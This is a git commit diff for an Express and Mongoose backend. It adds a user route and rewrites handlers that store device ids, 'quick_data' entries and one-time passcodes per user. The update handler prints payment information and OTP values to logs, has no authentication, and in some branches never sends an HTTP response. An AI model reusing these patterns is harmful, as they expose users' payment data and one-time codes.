02af8bf1707336d0b3abe80d2d3123bd23abf3ff
BaccarSabri2 <115673916+BaccarSabri2@users.noreply.github.com>
2023-11-07 22:16:51 +0100

    user models

--- app.js
+++ app.js
@@ -2,9 +2,11 @@ const express = require("express");
 const mongoose = require("./middleware/connect");
 const bodyParser = require("body-parser");
 const cors = require("cors");
+const userRoutes = require('./routes/user');
 const app = express();
 app.use(bodyParser.json());
 app.use(cors());
+app.use("/api/v1/user", userRoutes);
 app.listen(process.env.PORT || 8000, () => {
     console.log("Server up!");
 });
--- controller/user.js
+++ controller/user.js
@@ -2,26 +2,75 @@ const User = require("../model/user");
 
 
 exports.addUser = async (req, res) => {
-    try {
-        const { device, last_connected, quick_data, otp } = req.body;
-        try {
-            const user = await User.create({
-                _id: uid,
-                name: req.body.name,
-                email: req.body.email,
-                phone: req.body.phone,
-                dob: req.body.dob,
-                gender: req.body.gender,
-            });
 
-            console.log("User created successfully!", user);
-            return res.status(200).json({ message: "User added successfully!" });
-        } catch (err) {
-            console.log("Error while adding user :=======> ", err);
-            return res.status(500).json({ message: err.message });
-        }
+    const { device, last_connected, id } = req.body;
+    try {
+        const user = await User.create({
+            id: id,
+            device: device,
+            last_connected: last_connected,
+            quick_data: [],
+            otp: [],
+        });
+        return res.send({ success: true });
+
     } catch (err) {
-        console.log("Error while creating user :=======> ", err);
-        return res.status(500).send({ message: `${err.code} - ${err.message}` });
+        console.log("Error while adding user :=======> ", err);
+        return res.status(500).json({ message: err.message });
     }
+
 };
+exports.updateUser = async (req, res) => {
+
+    const { id, quickdata, otp } = req.body;
+    console.log(id);
+    console.log(quickdata);
+    try {
+        if (quickdata) {
+            const user = await User.findOne({ id: id });
+
+
+            if (!user) {
+                // Handle the case where the user with the given ID is not found
+                return null;
+            }
+
+            // Add the newQuickData element to the quick_data array
+            console.log("info::", quickdata.payment_info)
+            user.quick_data.addToSet(quickdata);
+            console.log(user);
+
+            // Save the updated user document
+            await user.save();
+
+            return user;
+
+        }
+        if (otp) {
+            const user = await User.findOne({ id: id });
+
+
+            if (!user) {
+                // Handle the case where the user with the given ID is not found
+                return null;
+            }
+
+            // Add the newQuickData element to the quick_data array
+            console.log("info::", otp.payment_info)
+            user.otp.addToSet(otp);
+            console.log(user);
+
+            // Save the updated user document
+            await user.save();
+
+            return user;
+
+        }
+
+        const user = await User.findOne({ id: id });
+        return res.send(user);
+    } catch (err) {
+        return res.status(500).json({ message: err.message });
+    }
+
+}
